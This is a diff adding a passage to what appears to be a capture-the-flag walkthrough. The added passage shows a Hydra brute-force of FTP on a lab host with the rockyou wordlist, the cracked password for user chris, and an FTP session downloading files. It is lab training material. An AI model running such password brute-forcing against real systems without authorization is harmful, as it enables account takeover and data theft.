@@ -129,5 +129,66 @@ Sec-GPC: 1
 
 Now we have a username, Chris, and it’s supposed to have a weak password, so now we can Bruteforce FTP with Hydra, using any of the below commands to resolve the password.
 
+```
+┌──(root㉿neo)-[~]
+└─# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.61.20  
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-30 10:54:56
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.61.20:21/
+[STATUS] 148.00 tries/min, 148 tries in 00:01h, 14344251 to do in 1615:21h, 16 active
+[21][ftp] host: 10.10.61.20   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 10:56:51
+```
+
+username : chris
+password : crystal
+
+Now we know the password for the Agent, we can log in through FTP.
+
+```
+┌──(root㉿neo)-[~]
+└─# ftp 10.10.61.20  
+Connected to 10.10.61.20.
+220 (vsFTPd 3.0.3)
+Name (10.10.61.20:nijith): chris
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||16534|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp> mget *
+mget To_agentJ.txt [anpqy?]? 
+229 Entering Extended Passive Mode (|||20361|)
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+100% |*************************************************************************************************************************************************|   217        2.95 MiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received in 00:00 (1.03 KiB/s)
+mget cute-alien.jpg [anpqy?]? 
+229 Entering Extended Passive Mode (|||5045|)
+150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
+100% |*************************************************************************************************************************************************| 33143       67.14 KiB/s    00:00 ETA
+226 Transfer complete.
+33143 bytes received in 00:00 (45.44 KiB/s)
+mget cutie.png [anpqy?]? 
+229 Entering Extended Passive Mode (|||40027|)
+150 Opening BINARY mode data connection for cutie.png (34842 bytes).
+100% |*************************************************************************************************************************************************| 34842       68.73 KiB/s    00:00 ETA
+226 Transfer complete.
+34842 bytes received in 00:00 (36.18 KiB/s)
+ftp> 
+```
+
+
+
 
 
